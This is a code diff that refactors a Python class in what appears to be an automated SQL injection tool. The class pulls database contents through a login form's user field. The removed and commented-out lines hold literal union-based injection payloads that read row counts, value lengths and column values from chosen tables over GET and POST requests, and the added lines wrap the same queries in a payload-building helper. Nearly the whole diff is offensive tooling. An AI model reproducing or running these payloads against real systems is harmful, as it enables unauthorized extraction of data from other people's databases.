@@ -110,8 +110,11 @@ class SqliContent(SqliColumns):
 
                 # 注这一条的数据长度
                 logger.debug("Start %dth content length sqli..." % (limits + 1))
-                payload = "user=ddog' union all SELECT 1,length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
-                    limits) + ",1%23&passwd=ddog123&submit=Log+In"
+                # payload = "user=ddog' union all SELECT 1,length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
+                #     limits) + ",1%23&passwd=ddog123&submit=Log+In"
+                payload = self.dealpayload.construct_normal_payload(select="length(" + column_name + ")",
+                                                                    source=database_name + "." + table_name,
+                                                                    limit=limits)
                 r = self.Data.GetData(payload)
                 content_len = int(UnpackFunction(r))
                 logger.debug("Content length sqli success...now is limit %d, The content_len is %d..." % (limits, content_len))
@@ -119,8 +122,11 @@ class SqliContent(SqliColumns):
 
                 # 然后注content
                 logger.debug("Start %dth content sqli..." % (limits + 1))
-                payload = "user=ddog' union SELECT 1," + column_name + " from " + database_name + "." + table_name + " limit " + repr(
-                    limits) + ",1%23&passwd=ddog123&submit=Log+In"
+                # payload = "user=ddog' union SELECT 1," + column_name + " from " + database_name + "." + table_name + " limit " + repr(
+                #     limits) + ",1%23&passwd=ddog123&submit=Log+In"
+                payload = self.dealpayload.construct_normal_payload(select=column_name,
+                                                                    source=database_name + "." + table_name,
+                                                                    limit=limits)
                 r = self.Data.GetData(payload)
                 content = UnpackFunction(r)
                 logger.debug("Content sqli success...The content is %s..." % content)
@@ -221,9 +227,12 @@ class SqliContent(SqliColumns):
                 logger.debug("The sqlimethod is %s..." % self.sqlimethod)
 
                 # 首先是tablename的长度
-                payload = {
-                    "user": "ddog' union all SELECT 1,length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
-                        limits) + ",1#", "passwd": "ddog123&submit=Log+In"}
+                # payload = {
+                #     "user": "ddog' union all SELECT 1,length(" + column_name + ") from " + database_name + "." + table_name + " limit " + repr(
+                #         limits) + ",1#", "passwd": "ddog123&submit=Log+In"}
+                payload = self.dealpayload.construct_normal_payload(select="length(" + column_name + ")",
+                                                                    source=database_name + "." + table_name,
+                                                                    limit=limits)
                 r = self.Data.PostData(payload)
                 content_len = int(UnpackFunction(r))
                 logger.debug(
@@ -231,10 +240,12 @@ class SqliContent(SqliColumns):
                 logger.info("[*] content_len: %d" % content_len)
 
                 # 然后注content
-                payload = {
-                    "user": "ddog' union all SELECT 1," + column_name + " from " + database_name + "." + table_name + " limit " + repr(
-                        limits) + ",1#", "passwd": "ddog123"}
-
+                # payload = {
+                #     "user": "ddog' union all SELECT 1," + column_name + " from " + database_name + "." + table_name + " limit " + repr(
+                #         limits) + ",1#", "passwd": "ddog123"}
+                payload = self.dealpayload.construct_normal_payload(select=column_name,
+                                                                    source=database_name + "." + table_name,
+                                                                    limit=limits)
                 r = self.Data.PostData(payload)
                 content = UnpackFunction(r)
                 logger.debug("Content sqli success...The content is %s..." % content)
@@ -349,7 +360,9 @@ class SqliContent(SqliColumns):
                 logger.debug("Start table's %s content amount sqli..." % table_name)
 
                 # 注数据的数量
-                payload = "user=ddog' union SELECT 1,count(*) from " + database_name + "." + table_name + " %23&passwd=ddog123&submit=Log+In"
+                # payload = "user=ddog' union SELECT 1,count(*) from " + database_name + "." + table_name + " %23&passwd=ddog123&submit=Log+In"
+                payload = self.dealpayload.construct_normal_payload(select="count(*)",
+                                                                    source=database_name + "." + table_name)
                 r = self.Data.GetData(payload)
                 content_count = int(UnpackFunction(r))
                 logger.debug("Content account sqli success...The count is %d..." % content_count)
@@ -414,8 +427,8 @@ class SqliContent(SqliColumns):
                 logger.debug("Start table's %s content amount sqli..." % table_name)
 
                 # 注数据的数量
-                payload = {
-                    "user": "ddog' union SELECT 1,count(*) from " + database_name + "." + table_name + " #", "passwd": "ddog123&submit=Log+In"}
+                payload = self.dealpayload.construct_normal_payload(select="count(*)",
+                                                                    source=database_name + "." + table_name)
                 r = self.Data.PostData(payload)
                 content_count = int(UnpackFunction(r))
                 logger.debug("Content account sqli success...The count is %d..." % content_count)
